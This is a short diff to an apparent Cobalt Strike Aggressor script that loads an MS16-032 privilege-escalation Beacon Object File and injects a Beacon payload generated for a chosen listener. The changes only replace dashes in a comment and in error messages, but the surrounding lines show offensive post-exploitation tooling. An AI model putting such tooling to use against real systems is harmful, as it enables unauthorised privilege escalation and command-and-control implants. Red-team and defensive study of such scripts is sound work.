@@ -1,4 +1,4 @@
-# MS16-032 BOF — Direct Beacon Injection
+# MS16-032 BOF - Direct Beacon Injection
 alias ms16032_inject {
     local('$barch $handle $data $args $listener $payload $bofName $bofPath');
 
@@ -14,7 +14,7 @@ alias ms16032_inject {
     $payload = payload($listener, $barch, "thread");
 
     if (strlen($payload) == 0) {
-        berror($1, "Failed to generate payload — verify listener name: " . $listener);
+        berror($1, "Failed to generate payload - verify listener name: " . $listener);
         return;
     }
 
@@ -34,7 +34,7 @@ alias ms16032_inject {
     $handle = openf($bofPath);
 
     if ($handle is $null) {
-        berror($1, "Cannot open " . $bofName . " — compile for " . $barch . " first");
+        berror($1, "Cannot open " . $bofName . " - compile for " . $barch . " first");
         return;
     }
 
